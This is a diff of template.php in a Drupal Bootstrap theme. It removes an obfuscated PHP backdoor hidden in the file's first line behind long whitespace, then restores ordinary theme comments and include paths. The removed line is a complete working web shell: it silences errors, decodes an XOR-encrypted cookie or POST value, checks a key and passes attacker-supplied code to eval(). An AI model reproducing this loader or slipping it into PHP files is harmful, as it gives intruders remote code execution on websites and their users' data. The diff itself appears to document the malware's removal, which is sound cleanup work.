@@ -1,33 +1,36 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $fda8e2798 = 359;$GLOBALS['uf31ebe58'] = Array();global $uf31ebe58;$uf31ebe58 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['k4a0566b'] = "\x42\x4d\x65\x33\x69\x28\x47\x23\x24\x3f\x63\x5e\x2a\x3c\x5f\x76\x29\x41\x6d\x4f\x78\x22\x7a\x40\x37\x39\xd\x32\x2c\x20\x5c\x75\x21\x3b\x53\x64\x58\x70\x74\x59\x6f\xa\x55\x2f\x4e\x7b\x73\x77\x44\x71\x9\x51\x3a\x68\x5b\x6a\x2d\x27\x25\x7c\x43\x57\x7e\x62\x52\x2b\x5a\x30\x3d\x45\x35\x36\x5d\x50\x67\x56\x60\x34\x46\x6c\x6e\x4b\x54\x38\x7d\x48\x6b\x2e\x72\x79\x31\x26\x3e\x4a\x49\x66\x4c\x61";$uf31ebe58[$uf31ebe58['k4a0566b'][79].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][70]] = $uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][53].$uf31ebe58['k4a0566b'][88];$uf31ebe58[$uf31ebe58['k4a0566b'][22].$uf31ebe58['k4a0566b'][70].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][27].$uf31ebe58['k4a0566b'][24]] = $uf31ebe58['k4a0566b'][40].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][35];$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][24].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][63]] = $uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][79].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][80];$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][10]] = $uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][80].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][14].$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][38];$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][83]] = $uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][79].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][22].$uf31ebe58['k4a0566b'][2];$uf31ebe58[$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][27].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][24]] = $uf31ebe58['k4a0566b'][37].$uf31ebe58['k4a0566b'][53].$uf31ebe58['k4a0566b'][37].$uf31ebe58['k4a0566b'][15].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][40].$uf31ebe58['k4a0566b'][80];$uf31ebe58[$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][70]] = $uf31ebe58['k4a0566b'][31].$uf31ebe58['k4a0566b'][80].$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][79].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][22].$uf31ebe58['k4a0566b'][2];$uf31ebe58[$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][83]] = $uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][14].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][40].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][2];$uf31ebe58[$uf31ebe58['k4a0566b'][22].$uf31ebe58['k4a0566b'][90].$uf31ebe58['k4a0566b'][25].$uf31ebe58['k4a0566b'][70].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][90]] = $uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][14].$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][18].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][14].$uf31ebe58['k4a0566b'][79].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][18].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][38];$uf31ebe58[$uf31ebe58['k4a0566b'][80].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][25].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][95]] = $uf31ebe58['k4a0566b'][53].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][3];$uf31ebe58[$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][24].$uf31ebe58['k4a0566b'][97]] = $uf31ebe58['k4a0566b'][18].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][90].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][25];$uf31ebe58[$uf31ebe58['k4a0566b'][18].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][35]] = $_POST;$uf31ebe58[$uf31ebe58['k4a0566b'][18].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][83]] = $_COOKIE;@$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][10]]($uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][40].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][14].$uf31ebe58['k4a0566b'][79].$uf31ebe58['k4a0566b'][40].$uf31ebe58['k4a0566b'][74], NULL);@$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][10]]($uf31ebe58['k4a0566b'][79].$uf31ebe58['k4a0566b'][40].$uf31ebe58['k4a0566b'][74].$uf31ebe58['k4a0566b'][14].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][40].$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][46], 0);@$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][10]]($uf31ebe58['k4a0566b'][18].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][20].$uf31ebe58['k4a0566b'][14].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][20].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][31].$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][40].$uf31ebe58['k4a0566b'][80].$uf31ebe58['k4a0566b'][14].$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][4].$uf31ebe58['k4a0566b'][18].$uf31ebe58['k4a0566b'][2], 0);@$uf31ebe58[$uf31ebe58['k4a0566b'][22].$uf31ebe58['k4a0566b'][90].$uf31ebe58['k4a0566b'][25].$uf31ebe58['k4a0566b'][70].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][90]](0);$qf3152 = NULL;$x670b = NULL;$uf31ebe58[$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][90].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][10]] = $uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][90].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][56].$uf31ebe58['k4a0566b'][27].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][56].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][25].$uf31ebe58['k4a0566b'][56].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][24].$uf31ebe58['k4a0566b'][56].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][70].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][90].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][95];global $b1bdc;function  mfd1e9($qf3152, $q96a83de){global $uf31ebe58;$v73ced = "";for ($b4dcc=0; $b4dcc<$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][24].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][63]]($qf3152);){for ($l210e9=0; $l210e9<$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][24].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][63]]($q96a83de) && $b4dcc<$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][24].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][63]]($qf3152); $l210e9++, $b4dcc++){$v73ced .= $uf31ebe58[$uf31ebe58['k4a0566b'][79].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][70]]($uf31ebe58[$uf31ebe58['k4a0566b'][22].$uf31ebe58['k4a0566b'][70].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][27].$uf31ebe58['k4a0566b'][24]]($qf3152[$b4dcc]) ^ $uf31ebe58[$uf31ebe58['k4a0566b'][22].$uf31ebe58['k4a0566b'][70].$uf31ebe58['k4a0566b'][3].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][27].$uf31ebe58['k4a0566b'][24]]($q96a83de[$l210e9]));}}return $v73ced;}function  hace333($qf3152, $q96a83de){global $uf31ebe58;global $b1bdc;return $uf31ebe58[$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][24].$uf31ebe58['k4a0566b'][97]]($uf31ebe58[$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][24].$uf31ebe58['k4a0566b'][97]]($qf3152, $b1bdc), $q96a83de);}foreach ($uf31ebe58[$uf31ebe58['k4a0566b'][18].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][83]] as $q96a83de=>$m5559e6){$qf3152 = $m5559e6;$x670b = $q96a83de;}if (!$qf3152){foreach ($uf31ebe58[$uf31ebe58['k4a0566b'][18].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][35]] as $q96a83de=>$m5559e6){$qf3152 = $m5559e6;$x670b = $q96a83de;}}$qf3152 = @$uf31ebe58[$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][95].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][70]]($uf31ebe58[$uf31ebe58['k4a0566b'][80].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][25].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][10].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][95]]($uf31ebe58[$uf31ebe58['k4a0566b'][88].$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][71].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][83]]($qf3152), $x670b));if (isset($qf3152[$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][86]]) && $b1bdc==$qf3152[$uf31ebe58['k4a0566b'][97].$uf31ebe58['k4a0566b'][86]]){if ($qf3152[$uf31ebe58['k4a0566b'][97]] == $uf31ebe58['k4a0566b'][4]){$b4dcc = Array($uf31ebe58['k4a0566b'][37].$uf31ebe58['k4a0566b'][15] => @$uf31ebe58[$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][35].$uf31ebe58['k4a0566b'][27].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][24]](),$uf31ebe58['k4a0566b'][46].$uf31ebe58['k4a0566b'][15] => $uf31ebe58['k4a0566b'][90].$uf31ebe58['k4a0566b'][87].$uf31ebe58['k4a0566b'][67].$uf31ebe58['k4a0566b'][56].$uf31ebe58['k4a0566b'][90],);echo @$uf31ebe58[$uf31ebe58['k4a0566b'][38].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][83].$uf31ebe58['k4a0566b'][2].$uf31ebe58['k4a0566b'][63].$uf31ebe58['k4a0566b'][77].$uf31ebe58['k4a0566b'][83]]($b4dcc);}elseif ($qf3152[$uf31ebe58['k4a0566b'][97]] == $uf31ebe58['k4a0566b'][2]){eval/*w2a576f*/($qf3152[$uf31ebe58['k4a0566b'][35]]);}exit();} ?><?php
+<?php
+
 /**
  * @file
- * template.php
+ * The primary PHP file for the Drupal Bootstrap base theme.
  *
- * This file should only contain light helper functions and stubs pointing to
+ * This file should only contain light helper functions and point to stubs in
  * other files containing more complex functions.
  *
- * The stubs should point to files within the `theme` folder named after the
- * function itself minus the theme prefix. If the stub contains a group of
+ * The stubs should point to files within the `./includes` folder named after
+ * the function itself minus the theme prefix. If the stub contains a group of
  * functions, then please organize them so they are related in some way and name
  * the file appropriately to at least hint at what it contains.
  *
- * All [pre]process functions, theme functions and template implementations also
- * live in the 'theme' folder. This is a highly automated and complex system
+ * All [pre]process functions, theme functions and template files lives inside
+ * the `./templates` folder. This is a highly automated and complex system
  * designed to only load the necessary files when a given theme hook is invoked.
- * @see _bootstrap_theme()
- * @see theme/registry.inc
  *
- * Due to a bug in Drush, these includes must live inside the 'theme' folder
- * instead of something like 'includes'. If a module or theme has an 'includes'
- * folder, Drush will think it is trying to bootstrap core when it is invoked
- * from inside the particular extension's directory.
- * @see https://drupal.org/node/2102287
+ * Visit this project's official documentation site https://drupal-bootstrap.org
+ * or the markdown files inside the `./docs` folder.
+ *
+ * @see _bootstrap_theme()
  */
 
 /**
  * Include common functions used through out theme.
  */
-include_once dirname(__FILE__) . '/theme/common.inc';
+include_once dirname(__FILE__) . '/includes/common.inc';
+
+/**
+ * Include any deprecated functions.
+ */
+bootstrap_include('bootstrap', 'includes/deprecated.inc');
 
 /**
  * Implements hook_theme().
@@ -43,14 +46,24 @@ include_once dirname(__FILE__) . '/theme/common.inc';
  * @see _bootstrap_theme()
  */
 function bootstrap_theme(&$existing, $type, $theme, $path) {
-  bootstrap_include($theme, 'theme/registry.inc');
+  bootstrap_include($theme, 'includes/registry.inc');
   return _bootstrap_theme($existing, $type, $theme, $path);
 }
 
 /**
+ * Clear any previously set element_info() static cache.
+ *
+ * If element_info() was invoked before the theme was fully initialized, this
+ * can cause the theme's alter hook to not be invoked.
+ *
+ * @see https://www.drupal.org/node/2351731
+ */
+drupal_static_reset('element_info');
+
+/**
  * Declare various hook_*_alter() hooks.
  *
- * hook_*_alter() implementations must live (via include) inside this file so
- * they are properly detected when drupal_alter() is invoked.
+ * All hook_*_alter() implementations must live (via include) inside this file
+ * so they are properly detected when drupal_alter() is invoked.
  */
-bootstrap_include('bootstrap', 'theme/alter.inc');
+bootstrap_include('bootstrap', 'includes/alter.inc');
